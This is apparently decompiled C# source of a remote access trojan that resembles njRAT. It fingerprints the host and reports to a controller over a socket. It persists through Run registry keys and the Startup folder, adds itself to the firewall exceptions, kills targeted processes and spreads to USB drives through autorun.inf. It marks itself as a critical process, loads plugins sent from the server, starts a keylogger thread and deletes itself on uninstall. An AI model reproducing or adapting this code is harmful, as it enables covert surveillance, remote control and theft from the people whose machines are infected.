					PLG = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Plugin(ZIP(memoryStream6.ToArray()), "A"))));
					NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(PLG), (Type)null, "H", new object[1] { H }, (string[])null, (Type[])null);
					NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(PLG), (Type)null, "P", new object[1] { P }, (string[])null, (Type[])null);
					NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(PLG), (Type)null, "c", new object[1] { C }, (string[])null, (Type[])null);
					break;
				}
				}
			}
			catch (Exception ex29)
			{
				ProjectData.SetProjectError(ex29);
				Exception ex30 = ex29;
				ProjectData.SetProjectError(ex30);
				Exception ex31 = ex30;
				if ((array.Length > 0 && ((Operators.CompareString(array[0], "Ex", false) == 0) | (Operators.CompareString(array[0], "PLG", false) == 0))) ? true : false)
				{
					PLG = null;
				}
				try
				{
					Send("ER" + Y + array[0] + Y + ex31.Message);
				}
				catch (Exception ex32)
				{
					ProjectData.SetProjectError(ex32);
					Exception ex33 = ex32;
					ProjectData.ClearProjectError();
				}
				ProjectData.ClearProjectError();
			}
		}
	}

	public static string inf()
	{
		string text = "ll" + Y;
		try
		{
			if (Operators.ConditionalCompareObjectEqual(RuntimeHelpers.GetObjectValue(GTV("vn", "")), (object)"", false))
			{
				string text2 = text;
				string s = DEB(ref VN) + "_" + HWD();
				text = text2 + ENB(ref s) + Y;
			}
			else
			{
				string text3 = text;
				string s = Conversions.ToString(RuntimeHelpers.GetObjectValue(GTV("vn", "")));
				string s2 = DEB(ref s) + "_" + HWD();
				text = text3 + ENB(ref s2) + Y;
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			string text4 = text;
			string s2 = HWD();
			text = text4 + ENB(ref s2) + Y;
			ProjectData.ClearProjectError();
		}
		try
		{
			text = text + Environment.MachineName + Y;
		}
		catch (Exception ex3)
		{
			ProjectData.SetProjectError(ex3);
			Exception ex4 = ex3;
			text = text + "??" + Y;
			ProjectData.ClearProjectError();
		}
		try
		{
			text = text + Environment.UserName + Y;
		}
		catch (Exception ex5)
		{
			ProjectData.SetProjectError(ex5);
			Exception ex6 = ex5;
			text = text + "??" + Y;
			ProjectData.ClearProjectError();
		}
		try
		{
			text = text + LO.LastWriteTime.Date.ToString("yy-MM-dd") + Y;
		}
		catch (Exception ex7)
		{
			ProjectData.SetProjectError(ex7);
			Exception ex8 = ex7;
			text = text + "??-??-??" + Y;
			ProjectData.ClearProjectError();
		}
		text = text + "" + Y;
		try
		{
			text += ((ServerComputer)F).Info.OSFullName.Replace("Microsoft", "").Replace("Windows", "Win").Replace("®", "")
				.Replace("™", "")
				.Replace("  ", " ")
				.Replace(" Win", "Win");
		}
		catch (Exception ex9)
		{
			ProjectData.SetProjectError(ex9);
			Exception ex10 = ex9;
			text += "??";
			ProjectData.ClearProjectError();
		}
		text += "SP";
		try
		{
			string[] array = Strings.Split(Environment.OSVersion.ServicePack, " ", -1, (CompareMethod)0);
			if (array.Length == 1)
			{
				text += "0";
			}
			text += array[checked(array.Length - 1)];
		}
		catch (Exception ex11)
		{
			ProjectData.SetProjectError(ex11);
			Exception ex12 = ex11;
			text += "0";
			ProjectData.ClearProjectError();
		}
		try
		{
			text = ((!Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles).Contains("x86")) ? (text + " x86" + Y) : (text + " x64" + Y));
		}
		catch (Exception ex13)
		{
			ProjectData.SetProjectError(ex13);
			Exception ex14 = ex13;
			text += Y;
			ProjectData.ClearProjectError();
		}
		text = ((!Cam()) ? (text + "No" + Y) : (text + "Yes" + Y));
		text = text + VR + Y + ".." + Y + ACT() + Y;
		string text5 = "";
		try
		{
			string[] valueNames = ((ServerComputer)F).Registry.CurrentUser.CreateSubKey("Software\\" + RG, RegistryKeyPermissionCheck.Default).GetValueNames();
			foreach (string text6 in valueNames)
			{
				if (text6.Length == 32)
				{
					text5 = text5 + text6 + ",";
				}
			}
		}
		catch (Exception ex15)
		{
			ProjectData.SetProjectError(ex15);
			Exception ex16 = ex15;
			ProjectData.ClearProjectError();
		}
		return text + text5;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public static void INS()
	{
		Thread.Sleep(1000);
		if ((Idr && !CompDir(LO, new FileInfo(Interaction.Environ(DR).ToLower() + "\\" + EXE.ToLower()))) ? true : false)
		{
			try
			{
				File.SetAttributes(Application.ExecutablePath, FileAttributes.Hidden);
				if (File.Exists(Interaction.Environ(DR) + "\\" + EXE))
				{
					File.Delete(Interaction.Environ(DR) + "\\" + EXE);
				}
				File.Copy(LO.FullName, Interaction.Environ(DR) + "\\" + EXE, overwrite: true);
				Process.Start(Interaction.Environ(DR) + "\\" + EXE);
				ProjectData.EndApp();
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.EndApp();
				ProjectData.ClearProjectError();
			}
		}
		try
		{
			Interaction.Shell("netsh firewall add allowedprogram \"" + LO.FullName + "\" \"" + LO.Name + "\" ENABLE", (AppWinStyle)0, false, -1);
		}
		catch (Exception ex3)
		{
			ProjectData.SetProjectError(ex3);
			Exception ex4 = ex3;
			ProjectData.ClearProjectError();
		}
		if (Isu)
		{
			try
			{
				((ServerComputer)F).Registry.CurrentUser.OpenSubKey(sf, writable: true).SetValue(RG, "\"" + LO.FullName + "\" ..");
			}
			catch (Exception ex5)
			{
				ProjectData.SetProjectError(ex5);
				Exception ex6 = ex5;
				ProjectData.ClearProjectError();
			}
			try
			{
				((ServerComputer)F).Registry.LocalMachine.OpenSubKey(sf, writable: true).SetValue(RG, "\"" + LO.FullName + "\" ..");
			}
			catch (Exception ex7)
			{
				ProjectData.SetProjectError(ex7);
				Exception ex8 = ex7;
				ProjectData.ClearProjectError();
			}
		}
		if (IsF)
		{
			try
			{
				File.SetAttributes(Application.ExecutablePath, FileAttributes.Hidden);
				File.Copy(LO.FullName, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + RG + ".exe", overwrite: true);
				FS = new FileStream(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + RG + ".exe", FileMode.Open);
			}
			catch (Exception ex9)
			{
				ProjectData.SetProjectError(ex9);
				Exception ex10 = ex9;
				ProjectData.ClearProjectError();
			}
		}
		if (anti2)
		{
			Interaction.Shell("taskkill /F /IM " + anti, (AppWinStyle)0, false, -1);
		}
		if (HD)
		{
			try
			{
				File.SetAttributes(Application.ExecutablePath, FileAttributes.Hidden);
			}
			catch (Exception ex11)
			{
				ProjectData.SetProjectError(ex11);
				Exception ex12 = ex11;
				ProjectData.ClearProjectError();
			}
		}
		if (!usb)
		{
			return;
		}
		string text = "autorun.inf";
		string text2 = usbx;
		FileAttributes fileAttributes = FileAttributes.Hidden;
		string programFiles = ((ServerComputer)MyProject.Computer).FileSystem.SpecialDirectories.ProgramFiles;
		string[] logicalDrives = Directory.GetLogicalDrives();
		string[] array = logicalDrives;
		for (int i = 0; i < array.Length; i = checked(i + 1))
		{
			programFiles = array[i];
			try
			{
				File.Copy(Application.ExecutablePath, programFiles + text2);
				File.SetAttributes(programFiles + text2, fileAttributes);
			}
			catch (Exception ex13)
			{
				ProjectData.SetProjectError(ex13);
				Exception ex14 = ex13;
				ProjectData.ClearProjectError();
			}
			try
			{
				StreamWriter streamWriter = new StreamWriter(programFiles + "\\" + text);
				streamWriter.WriteLine("[autorun]");
				streamWriter.WriteLine("open=" + programFiles + text2);
				streamWriter.WriteLine("shellexecute=" + programFiles, 1);
				streamWriter.Close();
				File.SetAttributes(programFiles + text, fileAttributes);
			}
			catch (Exception ex15)
			{
				ProjectData.SetProjectError(ex15);
				Exception ex16 = ex15;
				ProjectData.ClearProjectError();
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public static void ko()
	{
		//IL_0152: Unknown result type (might be due to invalid IL or missing references)
		//IL_015c: Expected O, but got Unknown
		if (Interaction.Command() != null)
		{
			try
			{
				((ServerComputer)F).Registry.CurrentUser.SetValue("di", "!");
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
			Thread.Sleep(5000);
		}
		bool createdNew = false;
		MT = new Mutex(initiallyOwned: true, RG, out createdNew);
		if (!createdNew)
		{
			ProjectData.EndApp();
		}
		INS();
		if (!Idr)
		{
			EXE = LO.Name;
			DR = LO.Directory.Name;
		}
		Thread thread = new Thread(RC, 1);
		thread.Start();
		try
		{
			kq = new kl();
			Thread thread2 = new Thread(kq.WRK, 1);
			thread2.Start();
		}
		catch (Exception ex3)
		{
			ProjectData.SetProjectError(ex3);
			Exception ex4 = ex3;
			ProjectData.ClearProjectError();
		}
		if (task)
		{
			mgr mgr2 = new mgr();
			Thread thread3 = new Thread(mgr2.protect);
			thread3.Start();
		}
		int num = 0;
		string text = "";
		if (BD)
		{
			try
			{
				SystemEvents.SessionEnding += new SessionEndingEventHandler(im);
				pr(1);
			}
			catch (Exception ex5)
			{
				ProjectData.SetProjectError(ex5);
				Exception ex6 = ex5;
				ProjectData.ClearProjectError();
			}
		}
		while (true)
		{
			Thread.Sleep(1000);
			if (!Cn)
			{
				text = "";
			}
			Application.DoEvents();
			try
			{
				num = checked(num + 1);
				if (num == 5)
				{
					try
					{
						Process.GetCurrentProcess().MinWorkingSet = (IntPtr)1024;
					}
					catch (Exception ex7)
					{
						ProjectData.SetProjectError(ex7);
						Exception ex8 = ex7;
						ProjectData.ClearProjectError();
					}
				}
				if (num >= 8)
				{
					num = 0;
					string text2 = ACT();
					if (Operators.CompareString(text, text2, false) != 0)
					{
						text = text2;
						Send("act" + Y + text2);
					}
				}
				if (!Isu)
				{
					continue;
				}
				try
				{
					if (Operators.ConditionalCompareObjectNotEqual(RuntimeHelpers.GetObjectValue(((ServerComputer)F).Registry.CurrentUser.GetValue(sf + "\\" + RG, "")), (object)("\"" + LO.FullName + "\" .."), false))
					{
						((ServerComputer)F).Registry.CurrentUser.OpenSubKey(sf, writable: true).SetValue(RG, "\"" + LO.FullName + "\" ..");
					}
				}
				catch (Exception ex9)
				{
					ProjectData.SetProjectError(ex9);
					Exception ex10 = ex9;
					ProjectData.ClearProjectError();
				}
				try
				{
					if (Operators.ConditionalCompareObjectNotEqual(RuntimeHelpers.GetObjectValue(((ServerComputer)F).Registry.LocalMachine.GetValue(sf + "\\" + RG, "")), (object)("\"" + LO.FullName + "\" .."), false))
					{
						((ServerComputer)F).Registry.LocalMachine.OpenSubKey(sf, writable: true).SetValue(RG, "\"" + LO.FullName + "\" ..");
					}
				}
				catch (Exception ex11)
				{
					ProjectData.SetProjectError(ex11);
					Exception ex12 = ex11;
					ProjectData.ClearProjectError();
				}
			}
			catch (Exception ex13)
			{
				ProjectData.SetProjectError(ex13);
				Exception ex14 = ex13;
				ProjectData.ClearProjectError();
			}
		}
	}

	public static string md5(byte[] B)
	{
		B = new MD5CryptoServiceProvider().ComputeHash(B);
		string text = "";
		byte[] array = B;
		foreach (byte b in array)
		{
			text += b.ToString("x2");
		}
		return text;
	}

	[DllImport("ntdll")]
	private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

	public static object Plugin(byte[] b, string c)
	{
		Module[] modules = Assembly.Load(b).GetModules();
		checked
		{
			int num = modules.Length - 1;
			int num2 = 0;
			while (true)
			{
				int num3 = num2;
				int num4 = num;
				if (num3 > num4)
				{
					break;
				}
				Module module = modules[num2];
				Type[] types = module.GetTypes();
				int num5 = types.Length - 1;
				int num6 = 0;
				while (true)
				{
					int num7 = num6;
					num4 = num5;
					if (num7 > num4)
					{
						break;
					}
					Type type = types[num6];
					if (type.FullName.EndsWith("." + c))
					{
						return module.Assembly.CreateInstance(type.FullName);
					}
					num6++;
				}
				num2++;
			}
			return null;
		}
	}

	public static void pr(int i)
	{
		try
		{
			NtSetInformationProcess(Process.GetCurrentProcess().Handle, 29, ref i, 4);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
	}

	public static void RC()
	{
		checked
		{
			while (true)
			{
				lastcap = "";
				if (C != null)
				{
					long num = -1L;
					int num2 = 0;
					try
					{
						while (true)
						{
							IL_0028:
							num2++;
							if (num2 == 10)
							{
								num2 = 0;
								Thread.Sleep(1);
							}
							if (!Cn)
							{
								break;
							}
							if (C.Available < 1)
							{
								C.Client.Poll(-1, SelectMode.SelectRead);
							}
							while (C.Available > 0)
							{
								if (num == -1)
								{
									int num3;
									for (string text = ""; true; text += Conversions.ToString(Conversions.ToInteger(Strings.ChrW(num3).ToString())))
									{
										num3 = C.GetStream().ReadByte();
										switch (num3)
										{
										case -1:
											break;
										case 0:
											num = Conversions.ToLong(text);
											text = "";
											if (num == 0)
											{
												Send("");
												num = -1L;
											}
											if (C.Available <= 0)
											{
												goto IL_0028;
											}
											goto IL_007e;
										default:
											continue;
										}
										goto end_IL_007e;
									}
								}
								b = new byte[C.Available + 1 - 1 + 1];
								long num4 = num - MeM.Length;
								if (b.Length > num4)
								{
									b = new byte[(int)(num4 - 1) + 1 - 1 + 1];
								}
								int count = C.Client.Receive(b, 0, b.Length, SocketFlags.None);
								MeM.Write(b, 0, count);
								if (MeM.Length == num)
								{
									num = -1L;
									Thread thread = new Thread(im, 1);
									thread.Start(MeM.ToArray());
									thread.Join(100);
									MeM.Dispose();
									MeM = new MemoryStream();
								}
								goto IL_0028;
								continue;
								end_IL_007e:
								break;
								IL_007e:;
							}
							break;
						}
					}
					catch (Exception ex)
					{
						ProjectData.SetProjectError(ex);
						Exception ex2 = ex;
						ProjectData.ClearProjectError();
					}
				}
				do
				{
					try
					{
						if (PLG != null)
						{
							NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(PLG), (Type)null, "clear", new object[0], (string[])null, (Type[])null, (bool[])null, true);
							PLG = null;
						}
					}
					catch (Exception ex3)
					{
						ProjectData.SetProjectError(ex3);
						Exception ex4 = ex3;
						ProjectData.ClearProjectError();
					}
					Cn = false;
				}
				while (!connect());
				Cn = true;
			}
		}
	}

	public static byte[] SB(ref string S)
	{
		return Encoding.UTF8.GetBytes(S);
	}

	public static bool Send(string S)
	{
		return Sendb(SB(ref S));
	}

	public static bool Sendb(byte[] b)
	{
		if (!Cn)
		{
			return false;
		}
		try
		{
			FileInfo lO = LO;
			lock (lO)
			{
				if (!Cn)
				{
					return false;
				}
				MemoryStream memoryStream = new MemoryStream();
				string S = b.Length + "\0";
				byte[] array = SB(ref S);
				memoryStream.Write(array, 0, array.Length);
				memoryStream.Write(b, 0, b.Length);
				C.Client.Send(memoryStream.ToArray(), 0, checked((int)memoryStream.Length), SocketFlags.None);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.SetProjectError(ex2);
			Exception ex3 = ex2;
			try
			{
				if (Cn)
				{
					Cn = false;
					C.Close();
				}
			}
			catch (Exception ex4)
			{
				ProjectData.SetProjectError(ex4);
				Exception ex5 = ex4;
				ProjectData.ClearProjectError();
			}
			ProjectData.ClearProjectError();
		}
		return Cn;
	}

	public static bool STV(string n, object t, RegistryValueKind typ)
	{
		bool result;
		try
		{
			((ServerComputer)F).Registry.CurrentUser.CreateSubKey("Software\\" + RG).SetValue(n, RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(t))), typ);
			result = true;
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			result = false;
			ProjectData.ClearProjectError();
		}
		return result;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public static void UNS()
	{
		pr(0);
		Isu = false;
		try
		{
			File.SetAttributes(Application.ExecutablePath, FileAttributes.Normal);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
		try
		{
			((ServerComputer)F).Registry.CurrentUser.OpenSubKey(sf, writable: true).DeleteValue(RG, throwOnMissingValue: false);
		}
		catch (Exception ex3)
		{
			ProjectData.SetProjectError(ex3);
			Exception ex4 = ex3;
			ProjectData.ClearProjectError();
		}
		try
		{
			((ServerComputer)F).Registry.LocalMachine.OpenSubKey(sf, writable: true).DeleteValue(RG, throwOnMissingValue: false);
		}
		catch (Exception ex5)
		{
			ProjectData.SetProjectError(ex5);
			Exception ex6 = ex5;
			ProjectData.ClearProjectError();
		}
		try
		{
			Interaction.Shell("netsh firewall delete allowedprogram \"" + LO.FullName + "\"", (AppWinStyle)0, false, -1);
		}
		catch (Exception ex7)
		{
			ProjectData.SetProjectError(ex7);
			Exception ex8 = ex7;
			ProjectData.ClearProjectError();
		}
		try
		{
			if (FS != null)
			{
				File.SetAttributes(Application.ExecutablePath, FileAttributes.Normal);
				FS.Dispose();
				File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + RG + ".exe");
			}
		}
		catch (Exception ex9)
		{
			ProjectData.SetProjectError(ex9);
			Exception ex10 = ex9;
			ProjectData.ClearProjectError();
		}
		try
		{
			((ServerComputer)F).Registry.CurrentUser.OpenSubKey("Software", writable: true).DeleteSubKey(RG, throwOnMissingSubKey: false);
		}
		catch (Exception ex11)
		{
			ProjectData.SetProjectError(ex11);
			Exception ex12 = ex11;
			ProjectData.ClearProjectError();
		}
		try
		{
			File.SetAttributes(Application.ExecutablePath, FileAttributes.Normal);
			Interaction.Shell("cmd.exe /k ping 0 & del \"" + LO.FullName + "\" & exit", (AppWinStyle)0, false, -1);
		}
		catch (Exception ex13)
		{
			ProjectData.SetProjectError(ex13);
			Exception ex14 = ex13;
			ProjectData.ClearProjectError();
		}
		ProjectData.EndApp();
	}

	public static byte[] ZIP(byte[] B)
	{
		MemoryStream memoryStream = new MemoryStream(B);
		GZipStream gZipStream = new GZipStream(memoryStream, CompressionMode.Decompress);
		byte[] array = new byte[4];
		checked
		{
			memoryStream.Position = memoryStream.Length - 5;
			memoryStream.Read(array, 0, 4);
			int num = BitConverter.ToInt32(array, 0);
			memoryStream.Position = 0L;
			byte[] array2 = new byte[num - 1 + 1 - 1 + 1];
			gZipStream.Read(array2, 0, num);
			gZipStream.Dispose();
			memoryStream.Dispose();
			return array2;
		}
	}
}
